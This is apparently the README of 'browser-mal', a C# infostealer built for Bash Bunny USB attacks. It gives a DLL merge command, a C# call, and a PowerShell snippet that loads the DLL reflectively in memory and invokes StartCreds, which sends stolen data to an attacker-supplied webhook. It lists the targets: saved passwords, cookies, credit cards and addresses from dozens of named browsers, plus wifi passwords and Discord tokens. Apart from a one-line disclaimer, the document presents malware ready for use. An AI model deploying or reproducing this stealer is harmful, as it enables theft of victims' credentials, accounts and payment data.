# browser-mal
This was made to be used with bash bunny for experimenting with payloads.
Please do not use for illegal activities.

## Merge Dll's

```
ILMerge.exe /out:browser.mal.dll BrowserMal.dll BouncyCastle.Crypto.dll Newtonsoft.Json.dll 
```

## Usage
```csharp
BrowserMal.Class1.StartCreds(<webhook>, extractWifi: true);
```

```powershell
$bytes = [System.IO.File]::ReadAllBytes("PATH TO DLL")
$assembly = [System.Reflection.Assembly]::Load($bytes)

$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Class1' }, 'First').GetMethod('StartCreds', [Reflection.BindingFlags] 'Static, Public, NonPublic')

$entryPointMethod.Invoke($null, @('WEBHOOK', $true))
```

## Functionality
- Extracts passwords, cookies, credit cards and addresses from gecko and chromium based browsers.
- Extracts saved wifi passwords.
- Extracts discord tokens.

## Browsers supported

- Chrome
- Opera
- Yandex
- 360 Browser
- Comodo Dragon
- CoolNovo
- SRWare Iron
- Torch Browser
- Brave Browser
- Iridium Browser
- 7Star
- Amigo
- CentBrowser
- Chedot
- CocCoc
- Elements Browser
- Epic Privacy Browser
- Kometa
- Orbitum
- Sputnik
- uCozMedia
- Vivaldi
- Sleipnir 6
- Citrio
- Coowon
- Liebao Browser
- QIP Surf
- Edge Chromium
- Firefox Developer
- SeaMonkey
- Firefox Nightly
- Waterfox
- Mozilla Thunderbird
- Pale Moon